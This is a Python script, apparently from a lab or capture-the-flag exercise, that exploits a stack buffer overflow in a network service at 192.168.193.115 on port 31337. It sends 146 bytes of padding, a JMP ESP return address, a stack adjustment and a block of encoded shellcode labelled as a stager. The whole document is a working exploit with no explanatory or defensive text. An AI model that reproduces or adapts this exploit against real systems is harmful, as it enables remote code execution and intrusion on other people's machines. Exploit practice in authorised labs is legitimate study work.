import socket
import struct

RHOST = "192.168.193.115"
RPORT = 31337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_total = 1024
buf_offset = 146

ptr_jmp_esp = 0x080414C3
sub_esp_10 = b"\x83\xec\x10"

payload =  b""
payload += b"\xba\x43\x8e\xa9\xee\xdb\xd1\xd9\x74\x24\xf4\x5b"
payload += b"\x31\xc9\xb1\x4f\x83\xeb\xfc\x31\x53\x0f\x03\x53"
payload += b"\x4c\x6c\x5c\x12\xba\xf2\x9f\xeb\x3a\x93\x16\x0e"
payload += b"\x0b\x93\x4d\x5a\x3b\x23\x05\x0e\xb7\xc8\x4b\xbb"
payload += b"\x4c\xbc\x43\xcc\xe5\x0b\xb2\xe3\xf6\x20\x86\x62"
payload += b"\x74\x3b\xdb\x44\x45\xf4\x2e\x84\x82\xe9\xc3\xd4"
payload += b"\x5b\x65\x71\xc9\xe8\x33\x4a\x62\xa2\xd2\xca\x97"
payload += b"\x72\xd4\xfb\x09\x09\x8f\xdb\xa8\xde\xbb\x55\xb3"
payload += b"\x03\x81\x2c\x48\xf7\x7d\xaf\x98\xc6\x7e\x1c\xe5"
payload += b"\xe7\x8c\x5c\x21\xcf\x6e\x2b\x5b\x2c\x12\x2c\x98"
payload += b"\x4f\xc8\xb9\x3b\xf7\x9b\x1a\xe0\x06\x4f\xfc\x63"
payload += b"\x04\x24\x8a\x2c\x08\xbb\x5f\x47\x34\x30\x5e\x88"
payload += b"\xbd\x02\x45\x0c\xe6\xd1\xe4\x15\x42\xb7\x19\x45"
payload += b"\x2d\x68\xbc\x0d\xc3\x7d\xcd\x4f\x89\x80\x43\xea"
payload += b"\xff\x83\x5b\xf5\xaf\xeb\x6a\x7e\x20\x6b\x73\x55"
payload += b"\x05\x93\x91\x7c\x73\x3c\x0c\x15\x3e\x21\xaf\xc3"
payload += b"\x7c\x5c\x2c\xe6\xfc\x9b\x2c\x83\xf9\xe0\xea\x7f"
payload += b"\x73\x78\x9f\x7f\x20\x79\x8a\xf0\xa9\xf2\x50\x83"
payload += b"\x46\x95\xff\x0f\xc4\x45\x2d\x93\x34\xa4\x0d\x7a"
payload += b"\x43\xda\x6d\x51\xfe\x68\x07\x89\x68\xf9\xa3\xb9"
payload += b"\x52\x2e\x63\x0b\x9b\x02\x55\x5a\xed\x5a\x87\xae"
payload += b"\x21\xab\xf9\xf9\x73\xf1\x3d\x36\x43\x35\x11\x46"
payload += b"\xc2\x4c\x01\xc9\x65\xcb\xaa\x3a\x03\x76\x39\x26"
payload += b"\xa3\x27\xb1\xc9\x4a\xb4\x5e\x6b\xc8\x6a\xd1\x18"
payload += b"\x21\x53\x3c\xb0\x34\xe7\x58\x27\xda\x62\x85\xd1"
payload += b"\x47\x19\xa6\x75\xd8\x91\x49\xff\x8a\x3e\xeb\x9b"
payload += b"\x7c\xb1\x98\x52\xbb\x11\x71\xba\xdd\x34\xf9\xa7"
payload += b"\x49\xe8\x71\x49\xf0\x7a\x1d\xe8\x66\xad\x91\x99"
payload += b"\x57\x91\x73\x5e"
# Pad to offset w/ garbage
buf = b"A" * (buf_offset)

# Overwrite esp
buf += struct.pack("<I", ptr_jmp_esp)
# instruction to move ESP away from its current location
buf += sub_esp_10

# stager
buf += payload

# padding
buf += b"B"*(buf_total - len(buf))
buf += b"\n"

s.send(buf)

print(s.recv(1024))
